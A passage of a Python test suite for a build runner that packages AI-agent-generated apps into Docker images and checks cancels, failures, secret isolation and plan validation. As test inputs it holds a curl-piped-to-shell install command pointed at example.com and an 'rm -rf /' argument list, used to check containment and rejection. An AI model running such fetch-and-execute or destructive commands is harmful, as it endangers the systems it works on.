        self.assertEqual(status["state"], "succeeded")
        self.assertEqual(status["exit_code"], 0)
        self.assertEqual(status["slug"], "todo")
        self.assertEqual(status["artifact"]["files"], 1)
        self.assertEqual(status["artifact"]["entry"], "index.html")
        # The packaging summary, not the agent's manifest, is what says the build is
        # runnable — and for an app it names the image that would run it.
        self.assertEqual(status["site"]["dist_files"], 2)
        self.assertEqual(status["site"]["image"], "olympus-app-todo:latest")
        self.assertIsNotNone(status["started_at"])
        self.assertIsNotNone(status["finished_at"])
        self.assertIn("manufacture: done", status["log_tail"])

    def test_a_generated_but_unpackaged_build_is_not_a_success(self) -> None:
        # The files exist and the agent exited 0, but nothing built them. Reporting
        # that as built hands the operator a directory that runs nothing.
        self.fake_manufacture(
            "set -euo pipefail\n"
            "mkdir -p builds/todo\n"
            'printf %s \'{"artifact":{"files":1,"bytes":1,"entry":"index.html"}}\' > builds/todo/MANIFEST.json\n'
        )
        script = self.repo / "scripts" / runner.Runner.PACKAGERS["app"]
        script.write_text("import sys\nsys.exit(2)\n", encoding="utf-8")

        self.enqueue()
        status = self.status()

        self.assertEqual(status["state"], "failed")
        # The wording says "build" rather than "package" because for a planned project
        # this is `docker build`: the install step runs inside the image, and the
        # failure is the package manager's own message rather than a missing scaffold.
        self.assertIn("did not build", status["message"])
        self.assertIn("exit 2", status["message"])

    def test_a_cancelled_build_is_recorded_as_cancelled(self) -> None:
        # The marker is dropped by the build itself, which is exactly how a click
        # in Studio arrives: a file in the shared directory, seen by the next poll.
        marker = self.queue / f"0123456789abcdef{runner.CANCEL_SUFFIX}"
        self.fake_manufacture(
            "set -euo pipefail\n"
            f"touch {marker}\n"
            "mkdir -p builds/todo\n"
            "sleep 120\n"
        )

        began = time.monotonic()
        self.enqueue()
        elapsed = time.monotonic() - began
        status = self.status()

        self.assertEqual(status["state"], "cancelled")
        # It stopped the tree instead of waiting out the sleep — a cancel that
        # only kills the shell leaves the agent running.
        self.assertLess(elapsed, 30, "the cancel waited for the build to finish")
        # Nothing half-built is left to block the next attempt.
        self.assertFalse((self.repo / "builds" / "todo").exists())
        # The marker is consumed, so it cannot cancel a later job.
        self.assertFalse(marker.exists())

    def test_a_stale_cancel_marker_does_not_cancel_the_next_build(self) -> None:
        # A marker for a job id the runner is only now claiming is not a request
        # to stop this run; clearing it at claim time is what makes that true.
        marker = self.queue / f"0123456789abcdef{runner.CANCEL_SUFFIX}"
        marker.write_text("{}", encoding="utf-8")
        self.fake_manufacture(
            "set -euo pipefail\n"
            "mkdir -p builds/todo\n"
            'printf %s \'{"artifact":{"dir":"builds/todo","files":1,"bytes":1,"entry":"index.html"}}\' '
            "> builds/todo/MANIFEST.json\n"
        )
        self.fake_packager("app")

        self.enqueue()

        self.assertEqual(self.status()["state"], "succeeded")
        self.assertFalse(marker.exists())

    def test_a_failing_build_is_recorded_as_failed(self) -> None:
        self.fake_manufacture('echo "boom" >&2\nexit 3\n')

        self.enqueue()
        status = self.status()

        self.assertEqual(status["state"], "failed")
        self.assertEqual(status["exit_code"], 3)
        self.assertIn("boom", status["log_tail"])

    def test_exit_zero_without_an_artifact_is_a_failure(self) -> None:
        # The whole reason `verify` exists: an agent that exits 0 having written
        # nothing must never be reported as a build.
        self.fake_manufacture('echo "I did nothing"\nexit 0\n')

        self.enqueue()
        status = self.status()

        self.assertEqual(status["state"], "failed")
        self.assertIn("wrote no manifest", status["message"])

    def test_a_rebuild_without_replace_keeps_the_previous_app(self) -> None:
        existing = self.repo / "builds" / "todo"
        existing.mkdir()
        (existing / "keep.txt").write_text("previous", encoding="utf-8")
        self.fake_manufacture("echo 'refusing to overwrite' >&2\nexit 1\n")

        self.enqueue(replace=False)

        self.assertTrue((existing / "keep.txt").is_file())
        self.assertEqual(self.status()["state"], "failed")

    def test_replace_removes_the_previous_app_first(self) -> None:
        existing = self.repo / "builds" / "todo"
        existing.mkdir()
        (existing / "stale.txt").write_text("previous", encoding="utf-8")
        self.fake_manufacture(
            "set -euo pipefail\n"
            'test ! -f builds/todo/stale.txt || { echo "stale file survived"; exit 9; }\n'
            "mkdir -p builds/todo\n"
            'printf %s \'{"artifact":{"files":1,"bytes":1,"entry":"index.html"}}\' > builds/todo/MANIFEST.json\n'
        )
        self.fake_packager("app")

        self.enqueue(replace=True)

        self.assertFalse((existing / "stale.txt").exists())
        self.assertEqual(self.status()["state"], "succeeded")

    def test_the_build_does_not_see_repo_secrets(self) -> None:
        # A value exported in this process legitimately outranks the file (see
        # `allowed_env`), so clear it for this test: it is about which keys cross from
        # the checkout and which must not, and it should not read differently on a
        # machine where someone has exported the model.
        exported = os.environ.pop("OMNIROUTE_MODEL", None)
        if exported is not None:
            self.addCleanup(os.environ.__setitem__, "OMNIROUTE_MODEL", exported)

        (self.repo / ".env").write_text(
            "OMNIROUTE_MODEL=auto/coding\n"
            "AUTHENTIK_TOKEN=leak-me\n"
            "CERULEAN_ADMIN_PASSWORD=leak-me\n"
            "VAULT_TOKEN=leak-me\n",
            encoding="utf-8",
        )
        self.fake_manufacture(
            "set -euo pipefail\n"
            "env | sort > builds/env.txt\n"
            "mkdir -p builds/todo\n"
            'printf %s \'{"artifact":{"files":1,"bytes":1,"entry":"index.html"}}\' > builds/todo/MANIFEST.json\n'
        )

        self.enqueue()

        seen = (self.repo / "builds" / "env.txt").read_text(encoding="utf-8")
        self.assertIn("OMNIROUTE_MODEL=auto/coding", seen)
        for secret in ("leak-me", "AUTHENTIK_TOKEN", "CERULEAN_ADMIN_PASSWORD", "VAULT_TOKEN"):
            self.assertNotIn(secret, seen, f"{secret} reached the build environment")

    def test_the_spec_is_passed_as_one_argument(self) -> None:
        # No shell, so a spec name can never become a second word — but assert it,
        # because this is the line where that would regress.
        self.fake_manufacture(
            "set -euo pipefail\n"
            'printf %s "$1" > builds/arg.txt\n'
            "mkdir -p builds/todo\n"
            'printf %s \'{"artifact":{"files":1,"bytes":1,"entry":"index.html"}}\' > builds/todo/MANIFEST.json\n'
        )

        self.enqueue()

        self.assertEqual((self.repo / "builds" / "arg.txt").read_text(), "build-requests/todo.md")


if __name__ == "__main__":
    unittest.main()


class TestThePlanOnDisk(RepoFixture):
    """A build that was not handed a plan in its request but has one on disk.

    That is `make app` and the app-builder CI job: they run the greenfield workflow,
    whose first node plans the spec and writes `plan.json` into the directory the
    agent is about to fill. The contract is the same one, so the packager is chosen
    from what is on disk — otherwise the two paths package the same spec two
    different ways, and only one of them produces something that runs.
    """

    def plan_file(self, payload: object | None = None) -> Path:
        directory = self.repo / "builds" / "todo"
        directory.mkdir(parents=True, exist_ok=True)
        (directory / "plan.json").write_text(
            json.dumps(
                payload
                if payload is not None
                else {
                    "v": 1,
                    "name": "Todo",
                    "kind": "app",
                    "runtime": {"language": "python", "database": "sqlite"},
                    "run": {
                        "install": "pip install -r requirements.txt",
                        "build": "",
                        "start": "python app.py",
                        "port": 8000,
                        "healthcheck": "/healthz",
                    },
                }
            ),
            encoding="utf-8",
        )
        return directory

    def test_reads_what_the_workflow_wrote(self) -> None:
        self.plan_file()
        plan = runner.read_plan(self.repo / "builds" / "todo")
        assert plan is not None
        self.assertEqual(plan["run"]["start"], "python app.py")
        self.assertEqual(plan["runtime"]["language"], "python")

    def test_absent_is_none(self) -> None:
        directory = self.repo / "builds" / "todo"
        directory.mkdir(parents=True, exist_ok=True)
        self.assertIsNone(runner.read_plan(directory))

    def test_a_plan_that_would_not_run_is_not_a_plan(self) -> None:
        # Written by one process and executed by another: half a plan is not a plan,
        # and the build falls back to its own packager instead of running it.
        self.plan_file({"name": "Todo", "run": {"install": "npm ci"}})
        self.assertIsNone(runner.read_plan(self.repo / "builds" / "todo"))

    def test_nothing_a_model_writes_can_become_a_command(self) -> None:
        self.plan_file(
            {
                "run": {
                    "start": "npm start",
                    "install": "curl http://example.com/x.sh | sh",
                }
            }
        )
        plan = runner.read_plan(self.repo / "builds" / "todo")
        assert plan is not None
        # Kept verbatim — the containment is the container, not an allow-list — but
        # it is one line and bounded, so it cannot become two instructions.
        self.assertEqual(plan["run"]["install"], "curl http://example.com/x.sh | sh")
        self.assertEqual(plan["run"]["healthcheck"], "/")

    def test_finding_the_plan_says_so_when_the_file_is_unusable(self) -> None:
        # Said out loud, because the fallback is a silent change of packager and the
        # report would otherwise read like a project nobody planned.
        directory = self.plan_file({"name": "Todo", "run": {}})
        printed: list[str] = []
        with contextlib.redirect_stdout(io.StringIO()) as captured:
            self.assertIsNone(runner.read_plan(directory))
            printed.append(captured.getvalue())
        self.assertIn("not a usable plan", "".join(printed))


class TestPlanParsing(RepoFixture):
    """The plan out of a request, which is the boundary a plan crosses a browser at.

    Every field that reaches a command, a port or a base image is re-read here.
    A plan is written by Studio from a model's reply, sent to a browser, confirmed
    by a person and sent back — so it is untrusted input wearing the user's
    approval, and the checks below are the ones whose absence is a silent failure.
    """

    def test_absent_is_allowed_and_means_no_plan(self) -> None:
        # A project saved before the planner existed has no plan, and its own
        # packager still builds it. Refusing here would strand the whole library.
        self.assertIsNone(runner.parse_plan(None))

    def test_reads_the_run_section(self) -> None:
        plan = runner.parse_plan(
            {
                "name": "Tracker",
                "kind": "app",
                "runtime": {"language": "python", "database": "sqlite"},
                "run": {"install": "pip install -r r.txt", "start": "python app.py", "port": 8000},
            }
        )
        assert plan is not None
        self.assertEqual(plan["runtime"]["language"], "python")
        self.assertEqual(plan["run"]["start"], "python app.py")
        self.assertEqual(plan["run"]["port"], 8000)
        self.assertEqual(plan["run"]["install"], "pip install -r r.txt")

    def test_refuses_something_that_is_not_an_object(self) -> None:
        for value in ("a plan", 42, [1, 2]):
            with self.assertRaises(runner.RequestError):
                runner.parse_plan(value)

    def test_refuses_a_plan_with_no_run_section(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.parse_plan({"name": "x"})

    def test_refuses_a_plan_with_no_start_command(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.parse_plan({"run": {"install": "npm ci", "start": "  "}})

    def test_refuses_a_command_that_is_not_a_string(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.parse_plan({"run": {"start": "npm start", "install": ["rm", "-rf", "/"]}})

    def test_refuses_a_command_over_the_length_limit(self) -> None:
        with self.assertRaises(runner.RequestError):
            runner.parse_plan({"run": {"start": "npm start", "install": "x" * 501}})

    def test_flattens_a_command_onto_one_line(self) -> None:
        # A newline inside a Dockerfile RUN is a continuation: it would join the next
        # instruction onto this command, which is how a plan stops meaning what it says.
        plan = runner.parse_plan({"run": {"start": "npm   run   start\n  "}})
        assert plan is not None
        self.assertEqual(plan["run"]["start"], "npm run start")

    def test_a_port_that_is_not_a_number_becomes_none(self) -> None:
        # The packager reads the port from plan.json and refuses a bad one; here it is
        # recorded as absent so nothing downstream can treat '8000' as 8000.
        plan = runner.parse_plan({"run": {"start": "npm start", "port": "8000"}})
        assert plan is not None
        self.assertIsNone(plan["run"]["port"])

    def test_a_healthcheck_that_is_not_a_path_falls_back(self) -> None:
        plan = runner.parse_plan({"run": {"start": "npm start", "healthcheck": "http://x"}})
        assert plan is not None
        self.assertEqual(plan["run"]["healthcheck"], "/")

    def test_kind_defaults_to_app(self) -> None:
        plan = runner.parse_plan({"run": {"start": "npm start"}})
        assert plan is not None
        self.assertEqual(plan["kind"], "app")
        plan = runner.parse_plan({"kind": "website", "run": {"start": "npm start"}})
        assert plan is not None
        self.assertEqual(plan["kind"], "website")

    def test_the_request_carries_it_through(self) -> None:
        payload = self.request(plan={"run": {"start": "python app.py", "port": 8000}})
        job = runner.validate_request(self.repo, payload)
        self.assertEqual(job["plan"]["run"]["start"], "python app.py")

    def test_a_request_without_a_plan_is_still_valid(self) -> None:
        job = runner.validate_request(self.repo, self.request())
        self.assertIsNone(job["plan"])

    def test_a_broken_plan_refuses_the_request_rather_than_the_build(self) -> None:
        # Refused before a job is claimed: a plan that fails half-way through a publish
        # has already materialised files and written a vhost.
        payload = self.request(plan={"run": {"start": ""}})
        with self.assertRaises(runner.RequestError):
            runner.validate_request(self.repo, payload)


class TestWritePlan(RepoFixture):
    def test_writes_the_plan_where_the_packager_reads_it(self) -> None:
        directory = self.repo / "builds" / "todo"
        directory.mkdir(parents=True)
        runner.write_plan(directory, {"run": {"start": "python app.py"}})

        written = json.loads((directory / "plan.json").read_text())
        self.assertEqual(written["run"]["start"], "python app.py")

    def test_does_nothing_without_a_plan(self) -> None:
        directory = self.repo / "builds" / "todo"
        directory.mkdir(parents=True)
        runner.write_plan(directory, None)
        self.assertFalse((directory / "plan.json").exists())

    def test_creates_the_directory(self) -> None:
        directory = self.repo / "builds" / "fresh"
        runner.write_plan(directory, {"run": {"start": "npm start"}})
        self.assertTrue((directory / "plan.json").is_file())


class TestProjectManifest(RepoFixture):
    def test_prefers_the_plan_driven_manifest(self) -> None:
        directory = self.repo / "builds" / "todo"
        directory.mkdir(parents=True)
        (directory / "project.manifest.json").write_text(
            json.dumps(
                {
                    "v": 1,
                    "kind": "app",
                    "slug": "todo",
                    "language": "python",
                    "image": "olympus-app-todo:latest",
                    "port": 8000,
                    "dist_files": 4,
                    "dist_bytes": 900,
                }
            )
        )
        site = runner.read_packaged(directory, "app")
        assert site is not None
        self.assertEqual(site["language"], "python")
        self.assertEqual(site["image"], "olympus-app-todo:latest")

    def test_falls_back_to_the_older_manifest(self) -> None:
        directory = self.repo / "builds" / "todo"
        directory.mkdir(parents=True)
        (directory / "app.manifest.json").write_text(
            json.dumps({"v": 1, "kind": "app", "slug": "todo", "dist_files": 2, "image": "x"})
        )
        site = runner.read_packaged(directory, "app")
        assert site is not None
        self.assertEqual(site["dist_files"], 2)


class TestArchonResolution(unittest.TestCase):
    """Where the check looks for the Archon CLI, and why it is not PATH alone.

    The check reported MISSING on a deployment whose builds work because it asked
    `shutil.which("archon")` and nothing else, while `.env`, `setup.sh` and
    `.archon/config.yaml` all point at a build inside the checkout. These tests pin
    the order and the "present is not runnable" rule that `manufacture.sh` applies.
    """

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.repo = Path(self._tmp.name)
        (self.repo / "core-modules" / "archon" / "bin").mkdir(parents=True)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def executable(self, relative: str, body: str = "#!/bin/sh\nexit 0\n") -> Path:
        """A stub CLI at `relative`, executable and answering `--version`."""
        path = self.repo / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
        path.chmod(0o755)
        return path

    def test_the_env_name_wins_and_is_read_relative_to_the_repo(self) -> None:
        # The `.env` form is relative, and the runner's working directory is the
        # repo — but the check must not depend on that.
        built = self.executable("core-modules/archon/bin/archon")
        env = {"ARCHON_BINARY": "./core-modules/archon/bin/archon", "PATH": "/usr/bin"}
        found, source, _tried = runner.resolve_archon(self.repo, env)
        self.assertEqual(found, str(built))
        self.assertEqual(source, "ARCHON_BINARY")

    def test_the_older_name_is_honoured_too(self) -> None:
        other = self.executable("opt/archon")
        env = {"ARCHON_BIN": str(other), "PATH": "/usr/bin"}
        found, source, _tried = runner.resolve_archon(self.repo, env)
        self.assertEqual(found, str(other))
        self.assertEqual(source, "ARCHON_BIN")

    def test_the_checkout_build_is_found_without_any_env(self) -> None:
        built = self.executable("core-modules/archon/bin/archon")
        found, source, _tried = runner.resolve_archon(self.repo, {"PATH": "/usr/bin"})
        self.assertEqual(found, str(built))
        self.assertEqual(source, "in this checkout")

    def test_a_file_that_cannot_run_is_not_a_finding(self) -> None:
        # An unbuilt checkout leaves `bin/archon` present and unusable; claiming it
        # works would be the same class of mistake as claiming it is absent.
        broken = self.executable("core-modules/archon/bin/archon", "#!/bin/sh\nexit 3\n")
        found, _source, tried = runner.resolve_archon(self.repo, {"PATH": "/usr/bin"})
        self.assertIsNone(found)
        self.assertIn(str(broken), tried)

    def test_a_directly_configured_path_that_cannot_run_falls_through(self) -> None:
        self.executable("missing/archon", "#!/bin/sh\nexit 1\n")
        built = self.executable("core-modules/archon/bin/archon")
        env = {"ARCHON_BINARY": "./missing/archon", "PATH": "/usr/bin"}
        found, source, _tried = runner.resolve_archon(self.repo, env)
        self.assertEqual(found, str(built))
        self.assertEqual(source, "in this checkout")

    def test_a_candidate_that_never_answers_is_skipped(self) -> None:
        # "Present and executable" is not "runnable": a CLI that hangs on
        # `--version` must not stop the check from finding the next one.
        self.executable("core-modules/archon/bin/archon", "#!/bin/sh\nsleep 60\n")
        runner.ARCHON_VERSION_TIMEOUT_SECONDS = 1
        self.addCleanup(setattr, runner, "ARCHON_VERSION_TIMEOUT_SECONDS", 20)
        found, _source, _tried = runner.resolve_archon(self.repo, {"PATH": "/usr/bin"})
        self.assertIsNone(found)

    def test_nothing_anywhere_lists_what_was_tried(self) -> None:
        found, source, tried = runner.resolve_archon(
            self.repo, {"ARCHON_BINARY": "./core-modules/archon/bin/archon", "PATH": "/usr/bin"}
        )
        self.assertIsNone(found)
        self.assertEqual(source, "")
        self.assertEqual(tried[0], str(self.repo / "core-modules" / "archon" / "bin" / "archon"))


class CheckReportsTheEndOfTheJobTest(RepoFixture):
    """`--check` names what the END of a job needs, not only the beginning.

    A job reaches docker after a model run has already been paid for, and it reaches
    the app runtime's own trees after manufacturing and packaging. Both are a second
    to check here and a whole job to discover in the log — which is why they are in
    the check, and why they are asserted rather than assumed.
    """

    def run_check(self, **overrides: str) -> subprocess.CompletedProcess:
        # manufacture.sh present, so the only findings left are the ones under test.
        script = self.repo / "scripts" / "manufacture.sh"
        script.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        script.chmod(0o755)
        env = dict(os.environ)
        env.update(overrides)
        return subprocess.run(  # noqa: S603 - fixed argv, no shell
            [
                sys.executable,
                str(RUNNER_PATH),
                "--check",
                "--repo",
                str(self.repo),
                "--queue",
                str(self.queue),
            ],
            capture_output=True,
            text=True,
            env=env,
            check=False,
        )

    def test_docker_and_the_buildx_plugin_are_both_reported(self) -> None:
        result = self.run_check()

        self.assertIn("docker", result.stdout)
        self.assertIn("buildx", result.stdout)

    def test_a_data_root_the_build_cannot_write_is_a_finding_with_the_fix(self) -> None:
        # A path that does not exist is not writable by anyone, root and container
        # root included — so this asserts the same thing wherever it runs, which a
        # mode-based test would not.
        never_made = self.repo / "runtime-that-was-never-made"

        result = self.run_check(OLYMPUS_APPS_ROOT=str(never_made))

        self.assertIn("NOT WRITABLE", result.stdout)
        self.assertIn(str(never_made), result.stdout)
        self.assertIn("install-build-runner.sh", result.stdout)
        self.assertEqual(result.returncode, 1)

    def test_a_writable_data_root_is_reported_and_not_found_missing(self) -> None:
        result = self.run_check(OLYMPUS_APPS_ROOT=str(self.repo))

        line = next(
            entry for entry in result.stdout.splitlines() if entry.strip().startswith("apps")
        )
        self.assertIn(str(self.repo), line)
        self.assertIn("writable", line)
        self.assertNotIn("NOT WRITABLE", line)
